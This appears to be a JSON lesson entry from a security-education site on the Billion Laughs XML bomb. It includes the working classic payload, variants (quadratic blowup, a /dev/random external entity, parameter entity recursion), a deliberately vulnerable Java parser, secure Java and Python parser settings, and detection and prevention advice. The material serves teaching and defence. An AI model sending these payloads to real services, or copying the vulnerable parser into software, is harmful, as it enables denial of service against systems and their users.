@@ -1,0 +1,107 @@
+{
+  "id": "dos-billion-laughs",
+  "category": "attack-vectors",
+  "title": "Billion Laughs Attack (XML Bomb)",
+  "description": "Denial of Service attacks via recursive entity expansion causing memory exhaustion and CPU consumption.",
+  "severity": "high",
+  "cvssScore": 7.5,
+  "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+  "cwe": "CWE-776: Improper Restriction of Recursive Entity References",
+  "owasp": "OWASP Top 10:2021 - A05: Security Misconfiguration",
+  "sections": [
+    {
+      "id": "overview",
+      "title": "Overview",
+      "type": "text",
+      "content": "The Billion Laughs attack (also known as an XML bomb or exponential entity expansion attack) is a Denial of Service attack that exploits XML entity expansion to consume excessive memory and CPU resources.\n\n**How It Works:**\nDefine entities that reference other entities recursively. Each level of expansion multiplies the data size exponentially, quickly exhausting server resources.\n\n**Attack Impact:**\n• Memory exhaustion (OutOfMemoryError)\n• CPU saturation (100% utilization)\n• Application crash or hang\n• Server unavailability\n• Resource starvation for other users\n\n**Why It's Called \"Billion Laughs\":**\nThe classic payload expands the string \"lol\" billions of times through 9 levels of entity references, creating approximately 3GB of data from a tiny XML file.\n\n**Related Attacks:**\n• Quadratic Blowup Attack (less severe expansion)\n• External Entity Expansion (combines with XXE)\n• DTD Recursion (similar principle in DTDs)"
+    },
+    {
+      "id": "classic-payload",
+      "title": "Classic Billion Laughs Payload",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n  <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n  <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n  <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n  <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n  <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n]>\n<lolz>&lol9;</lolz>",
+        "isVulnerable": true,
+        "filename": "billion-laughs.xml"
+      }
+    },
+    {
+      "id": "expansion-calculation",
+      "title": "Exponential Expansion Mathematics",
+      "type": "text",
+      "content": "Let's calculate the expansion:\n\n• lol = \"lol\" (3 bytes)\n• lol1 = 10 × lol = 10 × 3 = 30 bytes\n• lol2 = 10 × lol1 = 10 × 30 = 300 bytes\n• lol3 = 10 × lol2 = 10 × 300 = 3,000 bytes\n• lol4 = 10 × lol3 = 10 × 3,000 = 30,000 bytes\n• lol5 = 10 × lol4 = 10 × 30,000 = 300,000 bytes\n• lol6 = 10 × lol5 = 10 × 300,000 = 3,000,000 bytes (3 MB)\n• lol7 = 10 × lol6 = 10 × 3 MB = 30 MB\n• lol8 = 10 × lol7 = 10 × 30 MB = 300 MB\n• lol9 = 10 × lol8 = 10 × 300 MB = 3,000 MB (3 GB)\n\n**Final Result:**\nA 750-byte XML file expands to approximately 3 GB in memory!\n\nEach reference level multiplies the size by 10, creating exponential growth:\nSize = base_size × (expansion_factor ^ levels)\nSize = 3 × (10 ^ 9) = 3,000,000,000 bytes"
+    },
+    {
+      "id": "variants",
+      "title": "Attack Variants",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Quadratic Blowup (less severe but still effective) -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE bomb [\n  <!ENTITY a \"aaaaaaaaaa...\" (10,000 a's)>\n]>\n<bomb>&a;&a;&a;&a;&a;...</bomb> (repeat &a; 10,000 times)\n<!-- Creates 10,000 × 10,000 = 100,000,000 bytes (100 MB) -->\n\n<!-- External Entity Expansion -->\n<!DOCTYPE bomb [\n  <!ENTITY xxe SYSTEM \"file:///dev/random\">\n]>\n<bomb>&xxe;</bomb>\n<!-- Reads infinite random data, crashes parser -->\n\n<!-- Parameter Entity Recursion -->\n<!DOCTYPE bomb [\n  <!ENTITY % a \"&a;&a;\">\n  %a;\n]>\n<!-- Infinite recursion, stack overflow -->",
+        "isVulnerable": true,
+        "filename": "dos-variants.xml"
+      }
+    },
+    {
+      "id": "vulnerable-java",
+      "title": "Vulnerable Java Code",
+      "type": "code",
+      "code": {
+        "language": "java",
+        "code": "import javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport java.io.ByteArrayInputStream;\n\npublic class VulnerableXMLParser {\n    \n    public void parseXML(String xmlData) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            \n            // VULNERABLE: Default settings allow entity expansion\n            // No limits on entity expansion depth or size\n            \n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(\n                new ByteArrayInputStream(xmlData.getBytes())\n            );\n            \n            // When billion laughs payload is parsed:\n            // 1. Parser expands &lol9;\n            // 2. Recursively expands &lol8; ten times\n            // 3. Continues until expanding 1 billion \"lol\" strings\n            // 4. OutOfMemoryError: Java heap space\n            \n            System.out.println(\"Parsed successfully\");\n            \n        } catch (OutOfMemoryError e) {\n            System.err.println(\"Memory exhausted!\");\n            // Application crashes or hangs\n        } catch (Exception e) {\n            System.err.println(\"Parse error: \" + e.getMessage());\n        }\n    }\n}",
+        "isVulnerable": true,
+        "filename": "VulnerableXMLParser.java"
+      }
+    },
+    {
+      "id": "secure-java",
+      "title": "Secure Java Implementation",
+      "type": "code",
+      "code": {
+        "language": "java",
+        "code": "import javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.XMLConstants;\nimport org.w3c.dom.Document;\nimport java.io.ByteArrayInputStream;\n\npublic class SecureXMLParser {\n    \n    public Document parseXML(String xmlData) throws Exception {\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        \n        // PRIMARY DEFENSE: Disable DOCTYPE declarations\n        factory.setFeature(\n            \"http://apache.org/xml/features/disallow-doctype-decl\",\n            true  // Blocks all entity-based attacks\n        );\n        \n        // If DOCTYPE needed, disable entity expansion\n        factory.setFeature(\n            XMLConstants.FEATURE_SECURE_PROCESSING,\n            true  // Enables secure processing limits\n        );\n        factory.setExpandEntityReferences(false);  // Don't expand entities\n        \n        // Set entity expansion limits (if parser supports)\n        factory.setAttribute(\n            \"http://www.oracle.com/xml/jaxp/properties/entityExpansionLimit\",\n            \"100\"  // Maximum 100 entity expansions\n        );\n        \n        // Disable external entities (prevents XXE + external expansion)\n        factory.setFeature(\n            \"http://xml.org/sax/features/external-general-entities\",\n            false\n        );\n        factory.setFeature(\n            \"http://xml.org/sax/features/external-parameter-entities\",\n            false\n        );\n        factory.setFeature(\n            \"http://apache.org/xml/features/nonvalidating/load-external-dtd\",\n            false\n        );\n        \n        DocumentBuilder builder = factory.newDocumentBuilder();\n        return builder.parse(new ByteArrayInputStream(xmlData.getBytes()));\n    }\n}",
+        "isVulnerable": false,
+        "filename": "SecureXMLParser.java"
+      }
+    },
+    {
+      "id": "python-defense",
+      "title": "Python Defense with defusedxml",
+      "type": "code",
+      "code": {
+        "language": "python",
+        "code": "from defusedxml import ElementTree as DefusedET\nfrom defusedxml.lxml import fromstring as defused_fromstring\nimport xml.etree.ElementTree as ET\n\n# VULNERABLE: Standard library without protection\ndef parse_vulnerable(xml_data):\n    # This will expand entities and crash on billion laughs\n    tree = ET.fromstring(xml_data)\n    return tree\n\n# SECURE: Using defusedxml\ndef parse_secure(xml_data):\n    # defusedxml blocks:\n    # - Entity expansion beyond safe limits\n    # - DTD processing\n    # - External entity references\n    try:\n        tree = DefusedET.fromstring(xml_data)\n        return tree\n    except DefusedET.DTDForbidden:\n        print(\"DTD processing blocked\")\n    except DefusedET.EntitiesForbidden:\n        print(\"Entity expansion blocked\")\n    except DefusedET.ExternalReferenceForbidden:\n        print(\"External reference blocked\")\n\n# For lxml:\ndef parse_lxml_secure(xml_data):\n    # defusedxml.lxml automatically applies protections\n    tree = defused_fromstring(xml_data)\n    return tree\n\n# Manual configuration (if defusedxml not available):\nfrom lxml import etree\n\ndef parse_manual_secure(xml_data):\n    parser = etree.XMLParser(\n        resolve_entities=False,  # Don't expand entities\n        no_network=True,         # Block network access\n        huge_tree=False,         # Limit tree size\n        load_dtd=False          # Don't load DTDs\n    )\n    tree = etree.fromstring(xml_data, parser)\n    return tree",
+        "isVulnerable": false,
+        "filename": "secure_parser.py"
+      }
+    },
+    {
+      "id": "detection",
+      "title": "Detection and Monitoring",
+      "type": "text",
+      "content": "**Code Review Indicators:**\n• XML parsers without entity expansion limits\n• Missing DOCTYPE restrictions\n• No use of secure parsing libraries (defusedxml, etc.)\n• ExpandEntityReferences enabled\n• No memory or CPU limits for XML processing\n\n**Runtime Detection:**\n• Sudden CPU spikes during XML parsing\n• Memory usage rapidly increasing to maximum\n• OutOfMemoryError or similar exceptions\n• Application hang or unresponsiveness\n• Long parse times for small XML files\n\n**Testing Methodology:**\n1. Submit classic billion laughs payload\n2. Monitor server memory and CPU\n3. Measure parse time (should timeout or reject)\n4. Try variants with different expansion depths\n5. Test quadratic blowup attacks\n6. Verify parser limits are enforced\n\n**Monitoring & Alerting:**\n• Alert on high memory usage during XML parsing\n• Track XML parse duration metrics\n• Monitor for OutOfMemoryError exceptions\n• Set resource limits (cgroups, containers)\n• Implement parse timeouts"
+    },
+    {
+      "id": "prevention",
+      "title": "Prevention Best Practices",
+      "type": "text",
+      "content": "**Primary Defenses:**\n\n1. **Disable DOCTYPE Processing:**\n   Strongest protection - completely disallow DOCTYPE declarations\n   Blocks all entity-based attacks (XXE and DoS)\n\n2. **Disable Entity Expansion:**\n   If DOCTYPE needed, disable entity reference expansion\n   Set expandEntityReferences=false\n\n3. **Use Secure Libraries:**\n   Python: defusedxml, lxml with secure config\n   Java: Xerces with secure features\n   .NET: XmlReaderSettings with secure defaults\n   PHP: libxml_disable_entity_loader(true)\n\n4. **Set Entity Expansion Limits:**\n   Java: entityExpansionLimit (default 64000)\n   Configure lower limits for untrusted input\n   Limit entity nesting depth\n\n**Additional Defenses:**\n\n5. **Resource Limits:**\n   Set maximum memory for XML parser processes\n   Use containers/cgroups to limit resources\n   Implement parse timeouts\n\n6. **Input Validation:**\n   Reject XML with excessive <!ENTITY definitions\n   Limit XML document size (before parsing)\n   Check for suspicious patterns\n\n7. **Defense in Depth:**\n   Combine multiple protections\n   Monitor and alert on anomalies\n   Regular security testing"
+    }
+  ],
+  "relatedTopics": ["classic-xxe", "blind-xxe", "parameter-entities"],
+  "references": [
+    {
+      "title": "OWASP Billion Laughs Attack",
+      "url": "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
+    },
+    {
+      "title": "CWE-776: Improper Restriction of Recursive Entity References",
+      "url": "https://cwe.mitre.org/data/definitions/776.html"
+    },
+    {
+      "title": "defusedxml Documentation",
+      "url": "https://github.com/tiran/defusedxml"
+    }
+  ]
+}
